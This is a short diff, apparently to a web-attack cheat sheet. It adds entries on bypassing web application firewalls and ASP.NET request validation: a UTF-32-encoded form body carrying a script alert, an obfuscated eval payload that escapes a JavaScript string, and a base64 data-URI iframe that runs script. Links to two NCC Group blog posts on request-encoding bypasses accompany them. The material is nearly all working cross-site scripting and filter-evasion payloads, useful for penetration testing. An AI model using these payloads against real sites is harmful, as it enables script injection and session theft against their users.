@@ -62,8 +62,13 @@ Content-Type: application/x-www-form-urlencoded; charset=utf-32
 Content-Length: 325
  
 i%00%00%00n%00%00%00p%00%00%00u%00%00%00t%00%00%001%00%00%00=%3C%00%00%00s%00%00%00c%00%00%00r%00%00%00i%00%00%00p%00%00%00t%00%00%00%3E%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00%28%00%00%001%00%00%00%29%00%00%00%3C%00%00%00%2F%00%00%00s%00%00%00c%00%00%00r%00%00%00i%00%00%00p%00%00%00t%00%00%00%3E%00%00%00
+
+
+
 https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/
 https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/
+
+keyword=test%27));%20eval(%27~a~l~e~r~~t~~(~~1~~)~%27.replace(/~/g,%27%27));//
 
 <iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>
 <a
